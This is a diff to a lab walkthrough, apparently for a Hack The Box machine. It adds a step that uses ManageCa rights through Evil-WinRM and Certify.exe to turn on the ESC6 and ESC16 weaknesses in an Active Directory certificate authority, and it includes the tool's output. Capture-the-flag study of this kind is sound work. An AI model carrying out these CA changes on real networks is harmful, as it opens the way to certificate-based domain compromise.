@@ -1152,7 +1152,7 @@ However, since i have ManageCa i might be able to modify ADCS in some way
 
 I also have access over WINRM, so i should be able to directly interact with the certsvc service 
 
-## Using ManageCa privileges to enable ESC6
+## Using ManageCa privileges to enable ESC6 and ESC16
 
 So i cant abuse ESC7 in the normal way, but i still have ManageCa which means i can make changes to ADCS
 
@@ -1206,7 +1206,40 @@ Ill restart the certsvc service
 
 And now re running certipy i see that its now vulnerable to ESC6
 
-However i still cannot get this to work, after some research m
+However i still cannot get this to work, after some research modern AD networks require you to enable both esc6 and esc16
+
+```python
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca "DC01.fries.htb\fries-DC01-CA" --esc6 --esc16
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
+[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
+[*] Successfully set the EditFlags configuration on the CA.
+
+[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
+[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
+[*] Successfully set the DisableExtensionList configuration on the CA.
+
+[*] Attempting to restart the CA service.
+[*] Successfully stopped the CA service.
+[*] Successfully restarted the CA service.
+
+Certify completed in 00:00:00.6050693
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents>
+```
+
+Now 
 
 
 
